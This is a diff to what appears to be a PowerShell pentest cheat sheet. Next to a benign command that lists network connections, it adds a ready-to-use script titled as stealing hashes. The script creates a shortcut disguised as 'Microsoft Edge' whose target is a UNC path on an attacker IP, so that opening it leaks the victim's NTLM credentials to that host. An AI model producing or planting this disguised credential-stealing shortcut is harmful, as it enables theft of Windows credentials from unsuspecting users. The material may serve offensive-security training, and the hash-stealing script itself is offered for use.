@@ -59,3 +59,16 @@
 
 # View listening connections (with optional PID translation to Proc names)
 `$PROCS = Get-Process; Get-NetTCPConnection -LocalAddress <LOCAL_IP> | Sort-Object LocalPort | Select-Object @{n='Process';e={$ID = $_.OwningProcess; if($PROCS){($PROCS|?{$ID -eq $_.id}).name}else{$ID}}},LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table`
+
+# Create Malicious Shortcut (lnk) file to steal hashes
+```
+$Output_For_Lnk = "$pwd\Microsoft Edge.lnk"
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut($Output_For_Lnk)
+$lnk.TargetPath = "\\10.10.16.6\@source"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browse the web"
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
